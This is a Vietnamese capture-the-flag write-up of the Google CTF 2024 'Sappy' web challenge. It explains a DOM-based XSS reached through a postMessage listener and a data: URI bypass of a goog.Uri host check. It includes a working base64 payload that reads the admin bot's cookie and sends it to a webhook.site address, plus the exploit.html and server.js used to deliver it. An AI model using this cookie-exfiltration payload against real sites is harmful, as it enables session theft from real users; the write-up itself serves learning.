# Challenge
- Name: Sappy
- Author: Google
- Difficulty: above medium
  
  ![image](https://github.com/NoSpaceAvailable/GoogleCTF2024/assets/143888307/c84a04e7-da33-4409-b565-142e4c667b5e)

# Recon
- Trang web có giao diện khá đơn giản, khi truy cập thì ta được cung cấp 5 nút chức năng:
  - 4 nút nầy khi click vào sẽ cho ta 1 fact nho nhỏ về ngôn ngữ lập trình JavaScript: 
  
  ![image](https://github.com/NoSpaceAvailable/GoogleCTF2024/assets/143888307/bca9140f-b6f4-44bb-816b-3687f8e4561e)

  - Nút còn lại cho phép ta share một đường link đến admin bot:

  ![image](https://github.com/NoSpaceAvailable/GoogleCTF2024/assets/143888307/15c0c349-cde7-4cbc-a72a-3178b876e020)

- Ngoài ra, đề bài có note là flag nằm ở cookie của admin bot nên đây là 1 challenge XSS với mục tiêu là đánh cắp cookie.
- Tiến hành ấn F12, tab network và theo dõi các request được gửi đi khi ta click các nút mà đề bài cho thì thấy rằng chúng được call đến *sap.js* và xử lí, sau đó trả về cho người dùng data dưới dạng JSON:

  ![image](https://github.com/NoSpaceAvailable/GoogleCTF2024/assets/143888307/d08a251b-c6e3-4b83-80a3-7aa48a4788f1)

- Tiến hành phân tích mã nguồn, ta có cây thư mục như sau:

  ![image](https://github.com/NoSpaceAvailable/GoogleCTF2024/assets/143888307/e42f72ac-ffae-4baf-9944-73ae635a448d)

  - File *pages.json* là nơi chứa các JS fun fact mà challenge cung cấp khi ta click các nút ở trang chủ:

  ```json
  {
    "floating-point": {
      "title": "0.1 + 0.2 != 0.3",
      "html": "Because of the underyling floating point arithmetic, in JavaScript 0.1+0.2 is <b>not</b> equal to 0.3!"
    },
    "document-all": {
      "title": "document.all",
      "html": "document.all is an instance of Object, you can check it. But then: <code>typeof document.all === 'undefined'</code>!"
    },
    "plus-operator": {
      "title": "plus operator",
      "html": "Here's a little riddle: what is the result of <code>[]+{}</code>? It's <code>\"[object Object]\"</code>!"
    },
    "no-lowercase": {
      "title": "no lowercase characters",
      "html": "Do you know it's possible to call arbitrary JS code without using lowercase characters? Here I am calling <code>console.log(1)</code>: <code>[]['\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162']['\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162']('\\143\\157\\156\\163\\157\\154\\145\\56\\154\\157\\147\\50\\61\\51')()    </code>"
    }
  }
  ```

  - Tại *index.html*, ngoài mã HTML ra thì còn có các đoạn mã JS như sau:
    
    ```javascript
    const divPages = document.getElementById("pages");
      const iframe = document.querySelector("iframe");

      function onIframeLoad() {
        iframe.contentWindow.postMessage(
          `
            {
                "method": "initialize", 
                "host": "https://sappy-web.2024.ctfcompetition.com"
            }`,
          window.origin
        );
      }

      iframe.src = "./sap.html";
      iframe.addEventListener("load", onIframeLoad);
    ```
    Đoạn JS trên thực hiện chọn thẻ HTML có id là *pages*, chọn thẻ *iframe* đầu tiên xuất hiện trong trang web và lưu vào 2 hằng *divPages* và *iframe*. Source của iframe là *./sap.html*, khi mà iframe này được load thì sẽ call dến hàm *onIframeLoad()*. Hàm này thực hiện gửi một JSON message với method *initialize* đến iframe bằng phương thức postMessage().

    ```javascript
    window.addEventListener("message", (event) => {
        let data = event.data;
        try {
            data = JSON.parse(data);
            if (typeof data.method !== "string") return;
            switch (data.method) {
              case "heightUpdate": {
                if (typeof data.height === "number") {
                  iframe.height = data.height + 16;
                }
                break;
              }
            }
        } catch(e) {
          console.log(e)
        }
      });
    ```
    Sau khi thực hiện postMessage đến iframe thì cửa sổ chứa iframe (cửa sổ cha) sẽ lắng nghe message mà iframe trả về (ở dạng JSON). Nếu method là *heightUpdate* thì thực hiện thay đổi chiều cao hiển thị iframe.

    ```javascript
    fetch("pages.json")
        .then((r) => r.json())
        .then((json) => {
          for (const [id, { title }] of Object.entries(json)) {
            const button = document.createElement("button");
            button.setAttribute("class", "margin");
            button.innerText = title;
            button.addEventListener("click", () => switchPage(id));
            divPages.append(button);
          }
        });

      function switchPage(id) {
        const msg = JSON.stringify({
          method: "render",
          page: id,
        });
        iframe.contentWindow.postMessage(msg, window.origin);
      }
    ```
    Đoạn mã này thực hiện fetch data từ *pages.json*, sau đó thêm các nút chức năng với tiêu đề có trong dữ liệu trả về vào page. Nếu người dùng click vào nút nào thì cửa sổ cha thực hiện postMessage() đến iframe với method là *render*

    ```javascript
    function isValidUrl(u) {
        try {
          const url = new URL(u);
          return url.protocol === "http:" || url.protocol === "https:";
        } catch {
          return false;
        }
      }

      async function shareUrl() {
        const url = document.forms[0].elements.url.value;
        if (!isValidUrl(url)) {
          alert("Invalid URL");
          return;
        }
        const body = new URLSearchParams({ url });
        try {
          grecaptcha.ready(async () => {
              grecaptcha.execute('6LcIi_4pAAAAAI0i1O7d8qKzuBRoHN2WIt662Vnl', {action: 'submit'}).then(async (token) => {
                  body.set('g-recaptcha-response', token);
                  const resp = await fetch("/share", {
                    method: "POST",
                    body,
                  });
                  if (resp.status === 200) {
                    alert("I will visit the URL soon");
                  } else {
                    alert("Something went wrong!");
                  }                  
              });
          });

        } catch {
          alert("Something went wrong!");
        }
      }
    ```
    Phần JS còn lại thực hiện kiểm tra URL được submit đến bot có là 1 URL hợp lệ hay không. Phần recapcha thì chắc là để chống server chall bị bot spam :v
    
  - Kiểm tra *sap.html* thì ta có mã JS được dùng để trả về kết quả update chiều cao cho iframe của cửa sổ cha:

    ```javascript
    const INTERVAL = 100;
      let lastHeight = -1;
      setInterval(() => {
        const height = document.body.clientHeight;
        if (height === lastHeight) return;
        lastHeight = height;
        parent.postMessage(
          JSON.stringify({
            method: "heightUpdate",
            height: height,
          }),
          "*"
        );
      }, INTERVAL);
    ```

  - Ở *app.js* thì chỉ chứa logic xử lí route đến các endpoint và không có gì đặc sắc cho lắm. Tương tự, file *bot.js* cũng chỉ là 1 đoạn mã giả lập admin bot phục vụ việc XSS.
    
  - Tại file *sap.js* thì câu chuyện bắt đầu trở nên hay ho. Ở đây challenge đã sử dụng Google Closure Library, một thư viện JS cho phép tối ưu mã JS (đơn giản hóa code và tăng tốc thực thi code ở mức low-level). 

    ```javascript
    const Uri = goog.require("goog.Uri");
    ```
    Đầu tiên thực hiện gọi Class Uri trong namespace *goog*

    ```javascript
    function getHost(options) {
    if (!options.host) {
      const u = Uri.parse(document.location);
      return u.scheme + "://sappy-web.2024.ctfcompetition.com";
    }
  
      return validate(options.host);
    }
    ```
    Hàm *getHost()* thực hiện parse object Location trả về từ document.location, sau đó trích xuất giao thức rồi nối chuỗi với "://sappy-web.2024.ctfcompetition.com". Trong trường hợp object được truyền vào có tồn tại thuộc tính *host* thì call đến hàm *validate()*

    ```javascript
    function validate(host) {
      const h = Uri.parse(host);
      if (h.hasQuery()) {
        throw "invalid host";
      }
      if (h.getDomain() !== "sappy-web.2024.ctfcompetition.com") {
        throw "invalid host";
      }
      return host;
    }
    ```
    Hàm này thực hiện gọi phương thức *hasQuery()* để check xem trong URI có query string không. Phương thức *getDomain()* được gọi ra để kiểm tra xem host có phải là "sappy-web.2024.ctfcompetition.com" không. Nếu URI có query string hoặc không phải host đã định thì sẽ throw error.

    ```javascript
    function buildUrl(options) {
      return getHost(options) + "/sap/" + options.page;
    }
    ```
    Hàm này call đến hàm *getHost()* và thực hiện nối chuỗi với "/sap/" và page mà người dùng yêu cầu. Vậy thì hàm này sẽ trả về string có dạng như sau:
    ```text
    <scheme>://sappy-web.2024.ctfcompetition.com/sap/<page>
    ```

    ```javascript
    window.addEventListener(
      "message",
      async (event) => {
        let data = event.data;
        if (typeof data !== "string") return;
        data = JSON.parse(data);
        const method = data.method;
        switch (method) {

          case "initialize": {
            if (!data.host) return;
            API.host = data.host;
            break;
          }
          case "render": {
            if (typeof data.page !== "string") return;
            const url = buildUrl({
              host: API.host,
              page: data.page,
            });
            const resp = await fetch(url);
            if (resp.status !== 200) {
              console.error("something went wrong");
              return;
            }
            const json = await resp.json();
            if (typeof json.html === "string") {
              output.innerHTML = json.html;
            }
            break;
          }
        }
      },
      false
    );
    ```
    Ở đây, mã JS trên thiết lập một listener, khi mà có message được gửi đến window thì sẽ thực hiện parse dưới dạng JSON (nếu message ở dạng string). Message nên có dạng:
    ```json
    {"method":"method_here", "host":"something_here"}
    ```
    - Nếu method là initialize thì API.host sẽ có giá trị là data.host (thay vì là origin)
    - Nếu method là render thì call hàm buildUrl() để tạo 1 URL, rồi fetch() đến URL đó. Dữ liệu trả về của fetch() nên là 1 JSON, và cần có key "html". Sau đó, key HTML này sẽ được nhúng vào DOM của trang web thông qua *innerHTML*
   
- Tổng kết lại, flow của webapp như sau:
  - Trang web có các nút hiện JS fact, khi truy cập trang web thì một iframe có src là "sap.html" được tạo ra, đồng thời một message với method là initialize được postMessage() gửi đến iframe
  - Khi click vào 1 nút thì message với method render được gửi đến iframe, sau khi xử lí xong thì iframe trả về message cho cửa sổ cha nhằm upđate chiều cao cho chính nó
  - Data của các fact được lấy từ https://sappy-web.2024.ctfcompetition.com/sap/<page>
   
- Nhìn qua thì trang web này có vẻ không có chỗ để ném payload XSS thông thường vào, tuy nhiên sau khi đọc code thật kỹ thì mình nhận thấy logic trang web khá sus:
  - Thông thường thì innerHTML là một sink phổ biến trong các bài XSS. Ở *sap.js*, ta thấy nó được gán giá trị là *json.html*.
  - Lần lên các đoạn code phía trên, *json.html* lại là kết quả của fetch(url), url lại được build lên từ hàm *buildUrl()*.
  - Trong hàm *buildUrl()*, giá trị *data.page* và *API.host* thì lại hoàn toàn phụ thuộc vào bên thứ ba là message được gửi từ cửa sổ cha đến iframe
  => Vậy phải có cách nào đó để control được message gửi đến iframe, mục tiêu là thay đổi được giá trị *json.html*

- Nhận thấy rằng hàm postMessage() được gọi lên rất nhiều nên qua vài đường Google cơ bản, hàng chục bài viết về DOM-based XSS thông qua postMessage() hiện ra. Hàm này có cú pháp là postMessage(message, targetOrigin), được sử dụng để giao tiếp cross-origin giữa trang web cha với iframe bên trong nó, hoặc với pop-up được spawn ra từ trang web cha.
- Tuy nhiên, XSS có thể xảy ra khi mà tham số targetOrigin được set thành "\*", tức là có thể gửi message đến origin bất kì. Ở chall này thì *sap.html* có phần call postMessage() với targetOrigin được set về "\*" => XSS gadget
  ```javascript
  parent.postMessage(
    JSON.stringify({
      method: "heightUpdate",
      height: height,
    }),
    "*"  <--- gadget
  );
  ```

# Exploit
- Sau khi tham khảo các bài viết về lỗi XSS qua postMessage() thì việc cần làm là:
  - Tạo ra một payload popup được alert(1)
  - Tạo một website đơn giản có nhúng một iframe chứa trang web dính lỗi (https://sappy-web.2024.ctfcompetition.com/sap.html)
  - Thực hiện send message đến iframe sao cho innerHTML chèn một payload XSS vào, vd như ```<img src=x onerror=alert(1)>``` (lưu ý không xài <script> do innerHTML không cho thực thi mã trong tag này)
  - Setup một remote server rồi gửi cho admin bot

- Với DOM-based XSS thì gen payload trên devtool sẽ thuận tiện hơn. Sau khi truy cập vào https://sappy-web.2024.ctfcompetition.com/sap.html thì test thử một payload mẫu:
  
  ![image](https://github.com/NoSpaceAvailable/GoogleCTF2024/assets/143888307/29c1bd17-9dbe-4959-b8be-b1d60b4cc624)

  Có thể thấy dữ liệu đã được render vào trong DOM

1.  Control url trong fetch()
- Để tạo ra được payload popup alert(1) thì ta cần control được url sẽ sử dụng trong hàm fetch() (sap.js). Ta có thể thực hiện điều này bằng cách post một message với method initialize đến window với host tùy ý, sau đó gọi method render lên để thực hiện lấy data.
- Tuy nhiên, khi method là render thì url được đưa vào hàm *buildUrl()*. Vì thế ta không thể cho một url tùy ý ngay được.
  
2. Bypass restriction
- Ở hàm *buildUrl()*, host sẽ được đưa qua hàm *getHost()*, sau đó lại đưa qua hàm *validate()*. Để ý rằng hàm này không check scheme của host nên là ta có thể dùng trick *data:* để thực hiện chèn bất kì dữ liệu nào mà ta muốn. Syntax: ```data:[<mediatype>][;base64],<data>```
- Theo [document](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs) thì nếu trường mediatype bị bỏ trống hoặc không hợp lệ thì default là ```text/plain;charset=US-ASCII```

  ![image](https://github.com/NoSpaceAvailable/GoogleCTF2024/assets/143888307/f64103ac-641b-4b6a-9cff-f1f39025e770)

  ![image](https://github.com/NoSpaceAvailable/GoogleCTF2024/assets/143888307/c72d64d9-3c32-42c8-8d97-dfc9de2467ba)

- Method goog.Uri.parse() nhận diện điểm bắt đầu của trường host trong URI là sau chuỗi '//', vì thế nên ta cần chèn thêm // vào payload để có 1 URI hợp lệ
- Cũng method trên, host kết thúc khi parser gặp dấu '/', vì thế nên ta cần chèn thêm '/' sau host
  
  ![image](https://github.com/NoSpaceAvailable/GoogleCTF2024/assets/143888307/ef29f3cc-d34d-4938-a5af-361845d64534)

  Vì regex quá đau đầu nên mình để source code check var parser ở [đây](https://github.com/google/closure-library/blob/7818ff7dc0b53555a7fb3c3427e6761e88bde3a2/closure/goog/uri/utils.js#L189)

- Sau khi bypass được check host xong thì host được trả về sẽ được nối với "/sap/" + <page>, ta có thể vứt luôn phần này bằng cách chèn thêm hash symbol (#) vào sau cùng của host
- Ngoài ra data schema còn hỗ trợ định dạng base64 nên ta có thể encode payload thoải mái mà không lo về việc escape character:

  ![image](https://github.com/NoSpaceAvailable/GoogleCTF2024/assets/143888307/63fd0b1e-4b6e-4c3b-b251-874ceda7b45b)

- Hàm fetch() sẽ trả về dữ liệu như sau khi fetch đến URI:

  ![image](https://github.com/NoSpaceAvailable/GoogleCTF2024/assets/143888307/4f6f17bf-1e56-4473-9f1d-b7684d13c1f9)

- Sau khi vượt qua restrition thì ta gửi thêm một message với method là render để hiển thị nội dung ta muốn. Vậy thì payload lúc này sẽ là:

  ![image](https://github.com/NoSpaceAvailable/GoogleCTF2024/assets/143888307/3181322f-35d1-4104-a0b4-56eeab05bdcc)

- À, dữ liệu sau khi fetch() về phải ở dạng JSON và có chứa key 'html', vì thế nên chuỗi base64 phải là:

  ![image](https://github.com/NoSpaceAvailable/GoogleCTF2024/assets/143888307/ec61236e-e80e-46e8-bab8-839673adcf93)

- Và đây là kết quả:

  ![image](https://github.com/NoSpaceAvailable/GoogleCTF2024/assets/143888307/44bc437a-8868-4ee1-b1f0-a0b1ae208e20)

- Khi thử set một cookie bất kì trên trang web và thử alert cookie đó lên thì mình vẫn nhận được cookie trả về, tuy nhiên khi gửi payload đến admin bot để lấy flag thì lại không nhận được gì cả. Có thể là do phía bot Google đã set thuộc tính samesite=true nên mình cần phải spawn một window mới và lấy cookie từ window đó.
- Payload cuối cùng:
  ```text
  {"method":"initialize", "host":"data://sappy-web.2024.ctfcompetition.com/;base64,eyJodG1sIjoiPGltZyBzcmM9eCBvbmVycm9yPVwiY29uc3QgdyA9IHdpbmRvdy5vcGVuKCdodHRwczovL3NhcHB5LXdlYi4yMDI0LmN0ZmNvbXBldGl0aW9uLmNvbS9zYXAuaHRtbCcpO3NldFRpbWVvdXQoKCkgPT4ge2NvbnN0IGNvb2tlZSA9IHcuZG9jdW1lbnQuY29va2llO2ZldGNoKCdodHRwczovL3dlYmhvb2suc2l0ZS84NDlmYmY5My1iNThmLTQ5ZWUtOGU1Yi1hMGI5MzA3OTQxM2IvP2E9JyArIGJ0b2EoY29va2VlKSk7fSwgMTAwMCk7XCI+In0=#>"}
  {"method":"render", "page":"thich_gi_dat_nay"}
  ```

3. Tạo một website đơn giản nhúng iframe dính lỗi
- exploit.html:
  ```html
  <!DOCTYPE html>
  <html>
      <body>
          <script>
              function load() {
                  const iframe = document.getElementById("cc");
                  const pl = '{"method":"initialize", "host":"data://sappy-web.2024.ctfcompetition.com/;base64,eyJodG1sIjoiPGltZyBzcmM9eCBvbmVycm9yPVwiY29uc3QgdyA9IHdpbmRvdy5vcGVuKCdodHRwczovL3NhcHB5LXdlYi4yMDI0LmN0ZmNvbXBldGl0aW9uLmNvbS9zYXAuaHRtbCcpO3NldFRpbWVvdXQoKCkgPT4ge2NvbnN0IGNvb2tlZSA9IHcuZG9jdW1lbnQuY29va2llO2ZldGNoKCdodHRwczovL3dlYmhvb2suc2l0ZS84NDlmYmY5My1iNThmLTQ5ZWUtOGU1Yi1hMGI5MzA3OTQxM2IvP2E9JyArIGJ0b2EoY29va2VlKSk7fSwgMTAwMCk7XCI+In0=#>"}'
                  iframe.contentWindow.postMessage(pl, '*');
                  iframe.contentWindow.postMessage('{"method":"render", "page":"lmao"}', '*');    
              }
          </script>
          <iframe id="cc" src="https://sappy-web.2024.ctfcompetition.com/sap.html" onload="load()"></iframe>
      </body>
  </html>
  ```

- server.js:
  ```javascript
  const express = require("express")
  const fs = require("fs")
  
  app = express()
  
  app.get("/", async (req, res) => {
      fs.readFile("exploit.html", function (err, data) {
          res.writeHead(200, { "Content-Type": "text/html; charset=utf-8", "Access-Control-Allow-Origin" : "*" });
          res.write(data);
          return res.end();
      });
  });
  
  app.listen(1337, () => {
      console.log(`Listening on localhost:${1337}`);
  });
  ```
- Lưu ý nếu không set CORS header *Access-Control-Allow-Origin* thành "*" thì không thể thực hiện fetch() đến attacker server được (bị chặn lại)

  ![image](https://github.com/NoSpaceAvailable/GoogleCTF2024/assets/143888307/f73cf2c8-b7fd-4f34-a37f-bdc40f65b7b6)

# Flag
- CTF{parsing_urls_is_always_super_tricky}

- Kiến thức học được:
  - DOM-based XSS thông qua postMessage()
  - Nếu không cần fetch message từ site khác thì đừng dùng thêm event listener lên sự kiện "message"
  - Tham số targetOrigin của postMessage() không nên để là "*"
  - Dùng schema *data* có thể hữu ích trong một số trường hợp
  - CORS header: Access-Control-Allow-Origin
